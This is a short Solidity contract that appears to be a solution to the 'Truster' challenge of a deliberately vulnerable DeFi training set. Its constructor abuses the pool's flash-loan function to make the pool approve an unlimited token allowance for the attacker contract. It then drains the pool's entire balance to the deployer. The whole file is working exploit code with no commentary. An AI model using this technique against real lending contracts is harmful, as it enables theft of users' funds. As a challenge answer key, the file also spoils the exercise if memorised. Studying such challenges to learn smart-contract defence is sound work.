// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";

contract TrusterLenderPoolHack {
    constructor(TrusterLenderPool pool) {
        DamnValuableToken token = pool.token();
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint).max);
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), msg.sender, token.balanceOf(address(pool)));
    }
}
